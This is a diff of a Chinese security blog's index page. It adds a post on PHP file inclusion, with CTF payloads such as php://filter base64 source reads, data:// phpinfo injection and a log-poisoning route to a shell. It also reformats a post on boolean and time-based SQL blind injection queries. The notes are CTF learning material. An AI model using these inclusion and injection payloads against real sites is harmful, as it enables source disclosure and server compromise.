@@ -159,6 +159,121 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-php文件包含及利用其getshell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/26/php文件包含及利用其getshell/">php文件包含及利用其getshell</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/26/php文件包含及利用其getshell/" class="archive-article-date">
+  	<time datetime="2019-07-26T05:02:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x1-php中与包含有关的函数"><a href="#0x1-php中与包含有关的函数" class="headerlink" title="0x1 php中与包含有关的函数"></a><a href></a>0x1 php中与包含有关的函数</h2><p> php中一共有4个文件包含相关的函数，分别为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>   如果未找到文件，发出警告，继续执行。</span><br><span class="line"><span class="keyword">require</span>  如果未找到文件，发出致命错误，停止执行。</span><br><span class="line"><span class="keyword">include_once</span>  与<span class="keyword">include</span>相同，只包含一次。</span><br><span class="line"><span class="keyword">require_once</span>  与<span class="keyword">require</span>相同，只包含一次。</span><br></pre></td></tr></table></figure>
+<h2 id="0x2-支持的协议和封装协议"><a href="#0x2-支持的协议和封装协议" class="headerlink" title="0x2 支持的协议和封装协议"></a><a href></a>0x2 支持的协议和封装协议</h2><p> <a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">官方文档解释</a></p>
+<ol start="2">
+<li><a href="https://www.php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">file://</a> —访问本地文件系统 </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.http.php" target="_blank" rel="noopener">http://</a> — 访问 HTTP(s) 网址 </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.ftp.php" target="_blank" rel="noopener">ftp://</a> — 访问 FTP(s) URLs </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">php://</a> — 访问各个输入/输出流 </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.zlib.php" target="_blank" rel="noopener">zlib://</a> — 压缩流 </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.data.php" target="_blank" rel="noopener">data://</a> — 数据（RFC 2397） </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.glob.php" target="_blank" rel="noopener">glob://</a> — 查找匹配的文件路径模式 </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.phar.php" target="_blank" rel="noopener">phar://</a> — PHP 归档 </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php" target="_blank" rel="noopener">ssh2://</a> — Secure Shell 2 </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.rar.php" target="_blank" rel="noopener">rar://</a> — RAR </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.ogg.php" target="_blank" rel="noopener">ogg://</a> — 音频流 </li>
+<li><a href="https://www.php.net/manual/zh/wrappers.expect.php" target="_blank" rel="noopener">expect://</a> — 处理交互式的流  其中需要注意的是伪协议，如下：</li>
+</ol>
+<p>  . <strong>file://</strong><br>       <code>此协议默认目录是当前的工作目录。 /path/to/file.ext 等价于file://path/to/file.ext</code> </p>
+<p>  . <strong>php://</strong><br>      （1）php://input<br>      可以访问请求的原始数据的<strong>只读</strong>流。<br>      <img src="https://img-blog.csdnimg.cn/20190726102510265.PNG" alt="在这里插入图片描述"></p>
+<p>（2）php://filter<br>      是一种元封装器， 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">筛选过滤</a>应用。</p>
+<p> 使用例子：</p>
+<ul>
+<li>php://filter/resource=&lt;待过滤的数据流&gt;  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">readfile</span>(<span class="string">"php://filter/resource=http://www.example.com"</span>);这简单等同于：<span class="selector-tag">readfile</span>(<span class="string">"http://www.example.com"</span>); 实际上没有指定过滤器</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li>php://filter/read=&lt;读链需要应用的过滤器列表&gt;<br> 这个参数采用一个或以管道符 | 分隔的多个过滤器名称。  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 这会以大写字母输出 www.example.com 的全部内容 */</span></span><br><span class="line"><span class="selector-tag">readfile</span>(<span class="string">"php://filter/read=string.toupper/resource=http://www.example.com"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 这会和以上所做的一样，但还会用 ROT13 加密。 */</span></span><br><span class="line"><span class="selector-tag">readfile</span>(<span class="string">"php://filter/read=string.toupper|string.rot13/resource=http://www.example.com"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ul>
+<li>php://filter/write=&lt;写链需要应用的过滤器列表&gt;<br> 这个参数采用一个或以管道符 | 分隔的多个过滤器名称。  <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 这会通过 rot13 过滤器筛选出字符 "Hello World"</span></span><br><span class="line"><span class="comment"> 然后写入当前目录下的 example.txt */</span></span><br><span class="line"><span class="selector-tag">file_put_contents</span>(<span class="string">"php://filter/write=string.rot13/resource=example.txt"</span>,<span class="string">"Hello World"</span>);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="0x3-ctf中关于包含的漏洞"><a href="#0x3-ctf中关于包含的漏洞" class="headerlink" title="0x3 ctf中关于包含的漏洞"></a><a href></a>0x3 ctf中关于包含的漏洞</h2><p>  . 包含漏洞特征：<br>      ？page=a.asp<br>      ? home=b.html<br>      ? file=content</p>
+<p>  . 通过构造含有漏洞的语句，查看想要看的代码<br>      file=php://filter/read=convert.base64-encode/resource=index.php</p>
+<p>  . ?action=xxx&amp;mode=xxx(文件夹加上文件名)<br>      源码： <code>include($action.&#39;/&#39;.$mode.&#39;.php&#39;);</code><br>      伪协议包含形式：?action=php://filter/read-convert.base64-encode/resource=./&amp;mode=login</p>
+<p>  . 绕过方法</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?f=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=<span class="number">1.</span>jpg/resource=./show.php（正则  /resource=*.jpg/i）</span><br><span class="line">?f=data:<span class="keyword">text</span>/plain,<span class="meta">&lt;?</span>php phpinfo()<span class="meta">?&gt;</span></span><br><span class="line">?<span class="built_in">file</span>=data:<span class="keyword">text</span>/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure>
+<p> 借鉴Thinking师傅整理的手册：<img src="https://img-blog.csdnimg.cn/20190726111422518.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doMTF0ZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="0x4-getshell思路"><a href="#0x4-getshell思路" class="headerlink" title="0x4 getshell思路"></a><a href></a>0x4 getshell思路</h2><p>  . 文件自包含getshell<br>     我们可以通过上传文件在tmp目录生成临时的缓存文件，如果在这个过程中，让php崩溃（通过文件自包含，让php奔溃），导致没有把这个缓存文件删除，就可以让缓存文件一直留在tmp目录。如果这个时候存在一个文件包含的漏洞，就可以达到getshell的目的。</p>
+<p>  . 默认phpstudy安装环境下实现getshell<br>      默认安装的时候是没有开启日志记录功能的也就是不存在 access.log，但是默认存在php error log。我们通过访问不存在的带有payload文件，然后access.log就会写入payload,直接包含access.log来getshell。</p>
+<p>参考链接：<a href="https://xz.aliyun.com/t/5535" target="_blank" rel="noopener">https://xz.aliyun.com/t/5535</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件包含</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2019/07/26/php文件包含及利用其getshell/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-解决kali无法连接网络问题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -179,24 +294,12 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <ol>
-<li>键入 ifconfig -a 查看网卡 ，是否存在</li>
-</ol>
-<ol start="2">
-<li>键入 leafpad /etc/network/interfaces 查看其中是否有如下语句，没有添加上即可：<br> auto eth0<br> iface eth0 inet dhcp</li>
-</ol>
-<ol start="3">
-<li>然后重启：/etc/init.d/networking restart</li>
-</ol>
-<ol start="4">
-<li>如果仍无法连接网络，重置虚拟网络：编辑–虚拟网络编辑器</li>
-</ol>
-<ol start="5">
-<li>键入 leafpad /etc/NetworkManager/NetworkManager.conf 将其中的false改为true</li>
-</ol>
-<ol start="6">
-<li>键入ifup eth0 启动网卡</li>
-</ol>
+        <p> . 键入 ifconfig -a 查看网卡 ，是否存在</p>
+<p> . 键入 leafpad /etc/network/interfaces 查看其中是否有如下语句，没有添加上即可：<br>      auto eth0<br>      iface eth0 inet dhcp</p>
+<p> . 然后重启：/etc/init.d/networking restart</p>
+<p> . 如果仍无法连接网络，重置虚拟网络：编辑–虚拟网络编辑器</p>
+<p> . 键入 leafpad /etc/NetworkManager/NetworkManager.conf 将其中的false改为true</p>
+<p>  . 键入ifup eth0 启动网卡</p>
 
       
 
@@ -274,14 +377,8 @@
 </li>
 </ul>
 <h2 id="0x02布尔盲注"><a href="#0x02布尔盲注" class="headerlink" title="0x02布尔盲注"></a><a href></a>0x02布尔盲注</h2><p> 布尔盲注主要思路有正则匹配，运算符，比较函数等<br> 参考链接：<a href="https://www.anquanke.com/post/id/170626" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170626</a></p>
-<ol>
-<li>使用比较函数strcmp()  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and strcmp((substr((select user()),1,1)=<span class="emphasis">'r'</span>),1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and strcmp((substr((select user()),1,1)=<span class="emphasis">'r'</span>),0);</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">| id   | username | password |</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<ol start="2">
-<li>IFNULL() 函数  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and ifnull((substr((select user()),1,1)=<span class="emphasis">'r'</span>),0);</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">| id   | username | password |</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and ifnull((substr((select user()),1,1)=<span class="emphasis">'1r'</span>),0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
+<p>  . 使用比较函数strcmp()<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and strcmp((substr((select user()),1,1)=<span class="emphasis">'r'</span>),1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and strcmp((substr((select user()),1,1)=<span class="emphasis">'r'</span>),0);</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">| id   | username | password |</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>  . IFNULL() 函数<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id=1 and ifnull((substr((select user()),1,1)=<span class="emphasis">'r'</span>),0);</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">| id   | username | password |</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line"><span class="code">+------+</span>----------<span class="code">+----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where id=1 and ifnull((substr((select user()),1,1)=<span class="emphasis">'1r'</span>),0);</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
 <h2 id="0x03-子查询"><a href="#0x03-子查询" class="headerlink" title="0x03 子查询"></a><a href></a>0x03 子查询</h2><p> 在用到or的延时注入时可以用子查询缩短延时时间。当我们在做ctf<br> 题时，使用子查询缩短时间来爆破就会凸显出它的优势。</p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin order by if((substr((select user()),1,1)=<span class="emphasis">'r'</span>),(select 1 from(select sleep(2)) as b),password);</span><br><span class="line"><span class="code">+------+</span>-----------<span class="code">+----------+</span></span><br><span class="line">| id   | username  | password |</span><br><span class="line"><span class="code">+------+</span>-----------<span class="code">+----------+</span></span><br><span class="line">|    1 | admin     | admin    |</span><br><span class="line">|    3 | admin'111 | 11       |</span><br><span class="line">|    2 | cadmin    | fdfggh   |</span><br><span class="line"><span class="code">+------+</span>-----------<span class="code">+----------+</span></span><br><span class="line">3 rows in set (2.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin order by if((substr((select user()),1,1)=<span class="emphasis">'r'</span>),sleep(2),password);</span><br><span class="line"><span class="code">+------+</span>-----------<span class="code">+----------+</span></span><br><span class="line">| id   | username  | password |</span><br><span class="line"><span class="code">+------+</span>-----------<span class="code">+----------+</span></span><br><span class="line">|    1 | admin     | admin    |</span><br><span class="line">|    3 | admin'111 | 11       |</span><br><span class="line">|    2 | cadmin    | fdfggh   |</span><br><span class="line"><span class="code">+------+</span>-----------<span class="code">+----------+</span></span><br><span class="line">3 rows in set (6.05 sec)</span><br></pre></td></tr></table></figure>
 
@@ -417,6 +514,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
